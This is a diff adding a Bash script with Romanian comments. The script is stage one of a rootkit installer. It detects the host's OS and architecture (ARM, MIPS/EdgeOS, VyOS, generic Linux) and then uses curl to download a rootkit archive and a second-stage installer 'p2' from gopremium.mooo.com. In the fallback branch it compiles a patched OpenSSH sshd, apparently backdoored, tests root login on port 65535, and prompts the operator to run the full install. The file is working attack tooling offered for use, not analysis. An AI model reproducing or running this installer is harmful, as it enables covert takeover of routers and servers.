@@ -1,0 +1,212 @@
+#!/bin/bash
+############## OS & RK detection (p1)
+############## detecteaza OS, downloadeaza rk si ii face test
+
+rm -rf 1tempfiles ; mkdir 1tempfiles
+
+echo -e "\033[0;32m [+] \033[0m\033[0m trying to detect OS"
+arch=$(uname -m)
+kernel=$(uname -r)
+if [ -f /etc/lsb-release ]; then
+        os=$(lsb_release -s -d)
+elif [ -f /etc/debian_version ]; then
+        os="Debian $(cat /etc/debian_version)"
+elif [ -f /etc/redhat-release ]; then
+        os=`cat /etc/redhat-release`
+else
+        os="UNKNOWN OS $(uname -s) $(uname -r) aborting."
+        echo ; exit
+fi
+echo -e "\033[0;32m [+] \033[0m\033[0m OS found: $os (arch: $arch kernel: $kernel)"
+echo "$os (arch: $arch kernel: $kernel)" > 1tempfiles/os.txt
+
+
+echo -e "\033[0;32m [+] \033[0m\033[0m trying to find rk for this OS" # green
+if [ "$arch" == "armv7l" ] ; then
+        rk="arm71" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+elif [ "$arch" == "armv6l" ] ; then
+        rk="arm61" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+elif [ "$arch" == "mips64" ] ; then
+        rk="edgeos64" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+elif [ "$arch" == "mips" ] ; then
+        rk="edgeos" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+elif [ ! -z "$(uname -a|grep vyos)" ] && [ "$arch" == "x86_64" ] ; then
+        rk="vyos64" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+elif [ ! -z "$(uname -a|grep vyos)" ] && [ "$arch" == "i686" ] ; then
+        rk="vyos" ; echo "$rk" > 1tempfiles/rk.txt
+        echo "..." > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m $rk.tgz found. downloading rk & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/$rk.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+
+else
+        echo -e "\033[0;31m [-] \033[0m\033[0m rk not found" # red
+        echo -e "\033[0;32m [+] \033[0m\033[0m trying to install files needed for default kit" # green
+        echo
+        if [ -f /usr/bin/yum ] ; then yum install -y gcc make libgcrypt-devel zlib-devel openssl-devel ; fi
+        if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y gcc make libgcrypt11-dev zlib1g-dev libssl-dev ; fi
+        echo
+        echo -ne "\033[0;36m [x] \033[0m\033[0m press any key to download default rk kit or CTRL+c to exit" #cyan
+        read a
+        rk="default" ; echo "$rk" > 1tempfiles/rk.txt
+        echo ".unix" > 1tempfiles/side_files_dir.txt
+        echo -e "\033[0;32m [+] \033[0m\033[0m downloading default rk kit & install file (p2)" # green
+        rm -rf $rk.tgz ; rm -rf p2
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/default.tgz
+        curl --progress-bar -O http://gopremium.mooo.com/.../auto/p2
+        if [ ! -f $rk.tgz ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        if [ ! -f p2 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
+        echo -e "\033[0;32m [+] \033[0m\033[0m trying to make new rk" # green
+        tar mzxf $rk.tgz ; rm -rf $rk.tgz
+        maindir=`pwd` ; rkdir="$maindir/$rk"
+        cd $rkdir
+        rm -rf 1tempfiles/*
+        tar zxf openssh-5.9p1-cu-patch-SSHD-eu.tgz -C 1tempfiles/
+        cd 1tempfiles/openssh-5.9p1
+        ./configure --prefix=/usr --sysconfdir=/etc/ssh
+        make
+        if [ ! -f sshd ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m failed to make new rk. aborting" ; echo ; exit ; fi
+        rm -rf ../../default/ssh ; mv ssh ../../default/
+        rm -rf ../../default/scp ; mv scp ../../default/
+        rm -rf ../../default/sftp ; mv sftp ../../default/
+        rm -rf ../../default/sshd-* ; mv sshd ../../default/sshd-eu
+        cd ../.. ; rm -rf 1tempfiles/*  ### acum sunt in $rkdir
+        cd $maindir
+        echo -e "\033[0;32m [+] \033[0m\033[0m starting rk test " # green
+        chmod +x p2
+        cd $rkdir ; ./run test $rk 1>>$maindir/1tempfiles/log.rktest 2>>$maindir/1tempfiles/log.rktest
+        echo -e "\033[0;32m [+] \033[0m\033[0m rk test done (logs in $maindir/1tempfiles/log.rktest). please manually check:"
+        echo
+        echo "          $rkdir/$rk/test-sshd -p 65535"
+        echo "          telnet 127.0.0.1 65535  OR  ssh root@127.0.0.1 -p 65535"
+        echo "          killall -9 test-sshd"
+        echo
+        echo -e "\033[0;36m [x] \033[0m\033[0m After checking, run the full install: ./p2 " #cyan
+        echo
+
+
+
+fi
+
